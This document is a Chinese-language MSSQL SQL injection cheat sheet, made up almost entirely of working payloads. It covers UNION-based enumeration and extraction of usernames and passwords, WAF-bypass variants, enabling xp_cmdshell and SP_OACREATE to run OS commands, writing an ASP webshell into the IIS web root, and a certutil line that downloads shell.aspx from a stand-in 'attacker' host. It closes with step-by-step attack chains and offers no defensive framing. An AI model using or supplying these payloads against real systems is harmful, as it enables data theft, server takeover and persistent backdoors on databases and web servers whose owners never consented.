# MSSQL注入

## 2.1 基础探测 (sqli-mssql-basic)

### 执行步骤

#### 1. 探测注入点

```sql
' OR 1=1--
' OR '1'='1
1' AND 1=1--
1' AND 1=2--
```

#### 2. 获取版本信息

```sql
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
```

#### 3. 获取用户信息

```sql
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
```

#### 4. 获取数据库信息

```sql
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--
```

#### 5. 获取表名

```sql
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

#### 6. 获取列名

```sql
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

#### 7. 提取数据

```sql
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--
```

### WAF绕过

#### Hex编码

```sql
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
```

#### 注释绕过

```sql
'/**/UNION/**/SELECT/**/1,2,3--
' UN%00ION SELECT 1,2,3--
```

---

## 2.2 高级技术 - xp_cmdshell (sqli-mssql-advanced)

### 执行步骤

#### 1. 检测xp_cmdshell状态

```sql
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
```

#### 2. 开启xp_cmdshell

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

#### 3. 执行系统命令

```sql
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:\'--
```

#### 4. 写入WebShell

```sql
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```

#### 5. SP_OACREATE方法

```sql
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```

### WAF绕过 - 堆叠查询

```sql
'; EXEC('EXEC master..xp_cmdshell ''whoami''')-- 
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```

---

## 攻击链示例

### 基础利用流程

1. **探测注入点类型**
2. **获取版本和用户信息**
3. **枚举数据库结构**
4. **提取敏感数据**

### 高级利用流程

1. **检测当前用户权限**
2. **尝试开启xp_cmdshell**
3. **执行系统命令**
4. **写入WebShell或添加用户**
5. **如果xp_cmdshell被禁，尝试SP_OACREATE**
